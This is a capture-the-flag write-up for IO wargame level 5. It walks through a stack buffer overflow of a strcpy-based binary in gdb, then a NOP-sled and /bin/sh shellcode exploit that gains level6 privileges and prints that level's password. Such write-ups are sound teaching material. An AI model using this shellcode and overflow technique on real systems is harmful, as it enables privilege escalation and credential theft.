@@ -1,0 +1,310 @@
+I/O – level 5
+
+In level 5 there are two versions to try.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+level5@io:~$ cat /levels/level05.c
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+ 
+int main(int argc, char **argv) {
+ 
+char buf[128];
+ 
+if(argc &lt; 2) return 1;
+ 
+strcpy(buf, argv[1]);
+ 
+printf(&quot;%s\n&quot;, buf);
+ 
+return 0;
+}
+ 
+
+I decided after looking at the source codes for both of the binaries I would work with level05 instead of the alternative.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x080483b4 &lt;+0&gt;:     push   %ebp
+0x080483b5 &lt;+1&gt;:     mov    %esp,%ebp
+0x080483b7 &lt;+3&gt;:     sub    $0xa8,%esp
+0x080483bd &lt;+9&gt;:     and    $0xfffffff0,%esp
+0x080483c0 &lt;+12&gt;:    mov    $0x0,%eax
+0x080483c5 &lt;+17&gt;:    sub    %eax,%esp
+0x080483c7 &lt;+19&gt;:    cmpl   $0x1,0x8(%ebp)
+0x080483cb &lt;+23&gt;:    jg     0x80483d9 &lt;main+37&gt;
+0x080483cd &lt;+25&gt;:    movl   $0x1,-0x8c(%ebp)
+0x080483d7 &lt;+35&gt;:    jmp    0x8048413 &lt;main+95&gt;
+0x080483d9 &lt;+37&gt;:    mov    0xc(%ebp),%eax
+0x080483dc &lt;+40&gt;:    add    $0x4,%eax
+0x080483df &lt;+43&gt;:    mov    (%eax),%eax
+0x080483e1 &lt;+45&gt;:    mov    %eax,0x4(%esp)
+0x080483e5 &lt;+49&gt;:    lea    -0x88(%ebp),%eax
+0x080483eb &lt;+55&gt;:    mov    %eax,(%esp)
+0x080483ee &lt;+58&gt;:    call   0x80482d4 &lt;strcpy@plt&gt;
+0x080483f3 &lt;+63&gt;:    lea    -0x88(%ebp),%eax
+0x080483f9 &lt;+69&gt;:    mov    %eax,0x4(%esp)
+0x080483fd &lt;+73&gt;:    movl   $0x8048524,(%esp)
+0x08048404 &lt;+80&gt;:    call   0x80482b4 &lt;printf@plt&gt;
+0x08048409 &lt;+85&gt;:    movl   $0x0,-0x8c(%ebp)
+0x08048413 &lt;+95&gt;:    mov    -0x8c(%ebp),%eax
+0x08048419 &lt;+101&gt;:   leave
+0x0804841a &lt;+102&gt;:   ret
+End of assembler dump.
+I decided I would run the binary like I did before in level03 with a python script creating input for the buffer. I set a breakpoint right after the strcpy() (0x080483f3) and used the previous method of running the binary with an assigned buffer, with the buffer string set to “128” bytes”
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+(gdb) break *0x080483f3
+Breakpoint 1 at 0x80483f3
+(gdb) run $(python -c 'print &quot;A&quot;*128')
+Starting program: /levels/level05 $(python -c 'print &quot;A&quot;*128')
+ 
+Breakpoint 1, 0x080483f3 in main ()
+(gdb) x/32xw $esp
+0xbffffbb0:     0xbffffbd0      0xbffffe1f      0xb7ffeff4      0xbffffcb0
+0xbffffbc0:     0xb7fffac0      0xbffffc84      0xb7feb662      0xbffffc74
+0xbffffbd0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffbe0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffbf0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc00:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc10:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc20:     0x41414141      0x41414141      0x41414141      0x41414141
+I remove the breakpoint and run the binary again getting the following output.
+
+1
+2
+3
+4
+(gdb) run $(python -c 'print &quot;A&quot;*128')
+Starting program: /levels/level05 $(python -c 'print &quot;A&quot;*128')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[Inferior 1 (process 18950) exited normally]
+I then decided to attempt to find where the actual overflow occurs.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+&lt;/pre&gt;
+(gdb) run $(python -c 'print &quot;A&quot;*139')
+ The program being debugged has been started already.
+ Start it from the beginning? (y or n) y
+ 
+Starting program: /levels/level05 $(python -c 'print &quot;A&quot;*139')
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ [Inferior 1 (process 19039) exited normally]
+ 
+(gdb) run $(python -c 'print &quot;A&quot;*140')
+ The program being debugged has been started already.
+ Start it from the beginning? (y or n) y
+ 
+Starting program: /levels/level05 $(python -c 'print &quot;A&quot;*140')
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ 
+Program received signal SIGSEGV, Segmentation fault.
+ 0xb7e9ee00 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
+ 
+Starting program: /levels/level05 $(python -c 'print &quot;A&quot;*144')
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ 
+Program received signal SIGSEGV, Segmentation fault.
+ 0x41414141 in ?? ()
+From the above gdb output I found a buffer of 139 bytes is right before the EIP is overwritten and the next 4 bytes starting at byte 140 overwrite the EIP register crashing the binary. To verify these values even further I used the following code, “run $(python -c ‘print “A”*140 + “B”*4’)”.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+(gdb) run $(python -c 'print &quot;A&quot;*140 + &quot;B&quot;*4')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /levels/level05 $(python -c 'print &quot;A&quot;*140 + &quot;B&quot;*4')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+The 4 B’s successfully overwrite the EIP register entirely. So this means I need to generate the shellcode which allow me to get a shell with the escalated privileges. I was able to find a possible working shellcode, Smashing The Stack For Fun And Profit, the space for my shellcode is 139 bytes.
+
+1
+2
+Shellcode
+&quot;\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh&quot;
+I modified the python script which I pass the binary when executing to the following “run $(python -c ‘print “\x90″*102 + “\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh” + “B”*4’)”.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+(gdb) run $(python -c 'print &quot;\x90&quot;*102 + &quot;\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh&quot; + &quot;B&quot;*4')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /levels/level05 $(python -c 'print &quot;\x90&quot;*102 + &quot;\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh&quot; + &quot;B&quot;*4')
+ë^1ÀFF
+V
+N
+ó
+°
+Íèãÿÿÿ/bin/shBBBB
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+I now need to determine the memory location I want to overwrite the EIP register with which will jump back to the start of the shellcode and begins executing said shellcode.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+(gdb) x/600xb 0xbffffc40
+ 
+0xbffffe10:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe18:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe20:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe28:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe30:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe38:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe40:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe48:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe50:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe58:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe60:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe68:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffe70:     0x90    0x90    0x90    0x90    0x90    0x90    0xeb    0x18
+0xbffffe78:     0x5e    0x89    0x76    0x08    0x31    0xc0    0x88    0x46
+0xbffffe80:     0x07    0x89    0x46    0x0c    0x89    0xf3    0x8d    0x4e
+0xbffffe88:     0x08    0x8d    0x56    0x0c    0xb0    0x0b    0xcd    0x80
+0xbffffe90:     0xe8    0xe3    0xff    0xff    0xff    0x2f    0x62    0x69
+I decided to jump to a memory location in the middle of my NOP sled to the location of “0xbffffe40”, taking this memory location I add it to the python script to get the final product of “run $(python -c ‘print “\x90″*102 + “\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh” + “\x40\xfe\xff\xbf”‘)”.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+level5@io:~$ /levels/level05 $(python -c 'print &quot;\x90&quot;*102 + &quot;\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh&quot; + &quot;\x40\xfe\xff\xbf&quot;')
+ë^1ÀFF
+V
+N
+ó
+°
+Íèãÿÿÿ/bin/sh@þÿ¿
+sh-4.2$ id
+uid=1005(level5) gid=1005(level5) euid=1006(level6) groups=1006(level6),1005(level5),1029(nosu)
+sh-4.2$ cat /home/level6/.pass
+l1tbXUH2Q/Eotw
+sh-4.2$
